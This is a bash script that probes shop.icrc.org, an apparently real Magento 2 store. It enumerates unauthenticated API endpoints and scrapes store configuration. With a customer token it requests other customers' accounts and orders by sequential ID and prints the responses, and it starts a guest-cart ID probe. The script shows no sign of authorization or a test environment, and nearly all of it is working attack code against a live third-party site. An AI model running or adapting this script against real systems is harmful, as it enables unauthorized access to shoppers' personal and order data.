#!/bin/bash
# shop.icrc.org Magento 2 recon + IDOR test script
# Run with: bash scripts/icrc_shop_recon.sh [TOKEN]
export PATH="/usr/bin:/usr/local/bin:/usr/sbin:/bin:$PATH"

SHOP="https://shop.icrc.org"
TOKEN="${1:-}"

echo "=== STEP 1: Unauthenticated API path discovery ==="
for path in \
  "/rest/V1/directory/countries" \
  "/rest/V1/directory/currency" \
  "/rest/V1/store/storeConfigs" \
  "/rest/V1/store/websites" \
  "/rest/V1/categories" \
  "/rest/V1/cms/pages" \
  "/rest/V1/cms/blocks" \
  "/graphql" \
  "/swagger/schema.json" \
  "/rest/V1/swagger" \
  "/rest/V1/products" \
  "/api/rest/V1/directory/countries"; do
  /usr/bin/curl -sk \
    -w "HTTP_%{http_code}" \
    -o /tmp/mg_resp.txt \
    -H "Accept: application/json" \
    "${SHOP}${path}" > /tmp/mg_code.txt 2>/dev/null
  code=$(cat /tmp/mg_code.txt | /usr/bin/grep -o '[0-9]*$')
  printf "%-55s %s\n" "$path:" "HTTP $code"
  if [ "$code" = "200" ]; then
    /usr/bin/head -c 200 /tmp/mg_resp.txt
    echo
  fi
done

echo
echo "=== STEP 2: Store code discovery from homepage ==="
/usr/bin/curl -sk "${SHOP}/" -o /tmp/mg_home.txt
echo "--- baseUrl patterns ---"
/usr/bin/grep -oE '"baseUrl"\s*:\s*"[^"]*"' /tmp/mg_home.txt | /usr/bin/head -5
echo "--- store_code patterns ---"
/usr/bin/grep -oE 'store_code[": ]+[a-z_]+' /tmp/mg_home.txt | /usr/bin/head -5
echo "--- REST base URL ---"
/usr/bin/grep -oE '"rest/[^"]*"' /tmp/mg_home.txt | /usr/bin/head -10
echo "--- Mage.Urls ---"
/usr/bin/grep -oE '"Mage[^"]*"' /tmp/mg_home.txt | /usr/bin/head -5

echo
echo "=== STEP 3: Authenticated IDOR tests (requires TOKEN as first argument) ==="
if [ -z "$TOKEN" ]; then
  echo "No token provided. To get one:"
  echo "  1. Register at ${SHOP}/customer/account/create/"
  echo "  2. Run:"
  echo '     TOKEN=$(curl -sk -X POST "'"${SHOP}"'/rest/V1/integration/customer/token" \'
  echo '       -H "Content-Type: application/json" \'
  echo '       -d '"'"'{"username":"YOUR_EMAIL","password":"YOUR_PASS"}'"'"' | tr -d '"'"'"'"'"')"'
  echo "  3. Re-run this script with: bash scripts/icrc_shop_recon.sh \$TOKEN"
  exit 0
fi

echo "Using token: ${TOKEN:0:20}..."

for path in \
  "/rest/V1/customers/me" \
  "/rest/V1/customers/1" \
  "/rest/V1/customers/2" \
  "/rest/V1/customers/3" \
  "/rest/V1/orders/mine" \
  "/rest/V1/orders/1" \
  "/rest/V1/orders/2" \
  "/rest/V1/orders/3" \
  "/rest/V1/carts/mine"; do
  /usr/bin/curl -sk \
    -w "HTTP_%{http_code}" \
    -o /tmp/mg_auth_resp.txt \
    -H "Authorization: Bearer ${TOKEN}" \
    -H "Accept: application/json" \
    "${SHOP}${path}" > /tmp/mg_auth_code.txt 2>/dev/null
  code=$(cat /tmp/mg_auth_code.txt | /usr/bin/grep -o '[0-9]*$')
  printf "%-45s HTTP %s — " "$path:" "$code"
  /usr/bin/head -c 150 /tmp/mg_auth_resp.txt
  echo
done

echo
echo "=== STEP 4: Guest cart ID probe (IDOR on guest carts) ==="
# First create a guest cart to get a valid cartId format
GUEST_CART=$(/usr/bin/curl -sk -X POST \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  "${SHOP}/rest/V1/guest-carts")
echo "Guest cart response: $GUEST_CART"
